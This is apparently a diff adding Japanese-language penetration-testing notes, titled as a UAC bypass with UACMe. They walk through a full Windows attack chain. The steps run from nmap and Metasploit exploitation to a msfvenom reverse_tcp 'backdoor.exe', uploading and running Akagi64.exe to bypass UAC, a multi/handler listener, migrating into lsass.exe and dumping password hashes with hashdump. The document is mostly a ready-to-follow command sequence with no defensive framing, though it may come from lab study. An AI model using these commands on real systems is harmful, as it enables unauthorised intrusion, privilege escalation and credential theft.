@@ -1,0 +1,39 @@
+UACbypass：UACMe
+1) pingを使ってホストが稼働しているかどうかを確認する
+2) nmapを使ってセキュリティホールがあるかどうかを確認する
+3) searchsploit サービス名でexploitがあるかどうかを確認する
+4) service postgresql start && msfconsole
+5) search サービス名
+6) setで基本情報をセットする
+7) exploitでmeterpreterの権限を奪う
+8) getuidで権限を確認する
+9) getinfoでターゲットのOSや構造を確認する
+10) ps -S explorer.exeでPIDを検索して、migrate PIDで現在のプロセスをexplorerプロセスに移行する
+11) getsystemで高い権限に昇格する。
+12) shellを獲得して、net localgroup administratorsで管理者ユーザーがadministratorshグループのメンバーであるかを確認する
+
+UACMeツールを使って、管理者ユーザーのバイパスを行う
+13) 新しいターミナルを開いて、msfvenomで悪意のあるファイルを生成する
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=4444 -f exe > 'backdoor.exe'
+file backdoor.exe
+14) meterpreterに戻って、バッドドアのファイルをアップロードする
+CTRL+C
+cd C:\\Users\\admin\\AppData\\Local\\Temp
+upload /root/Desktop/tools/UACME/Akagi64.exe .
+upload /root/backdoor.exe .
+ls
+15) 別なターミナルを開いて、exploit/multi/handlerを起動する
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST
+set LPORT 4444
+exploit
+16) meterpreterの戻って、Akagi64.exeを実行する
+shell
+Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+17) exploit/multi/handlerを起動したターミナルに戻って、以下のコマンドを使ってPIDに移行する
+ps -S lsass.exe
+migrate PID
+18) ハッシュをダンプする
+hashdump
